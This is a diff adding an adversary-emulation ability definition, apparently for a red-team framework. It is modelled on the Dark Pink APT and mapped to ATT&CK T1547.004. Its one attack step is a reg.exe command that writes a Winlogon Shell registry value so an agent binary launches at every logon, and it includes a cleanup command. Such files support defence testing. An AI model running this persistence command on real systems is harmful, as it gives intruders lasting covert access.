@@ -1,0 +1,37 @@
+- tactic: persistence
+  technique_name: 'Boot or Logon Autostart Execution: Winlogon Helper DLL'
+  technique_id: T1547.004
+  name: Winlogon HKCU Shell Key Agent Execution (reg.exe)
+  description: This ability is derived from the APT Dark Pink. Logon persistence is
+    achieved by using reg.exe to create a Shell value under HKCU\Software\Microsoft\Windows
+    NT\CurrentVersion\Winlogon key. This value includes both explorer.exe and the
+    agent binary to preserve the default Windows shell behavior while executing the
+    agent after logon.
+  executors:
+  - name: psh
+    platform: windows
+    command: "reg.exe add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\\
+      Winlogon\"\n /v Shell /t REG_SZ /d \"explorer.exe, #{location} -server #{server}\
+      \ -group #{group}\" /f"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup:
+    - Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Force;
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - persistence
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: 87a9177a-3c23-446a-afa2-7397db28f208
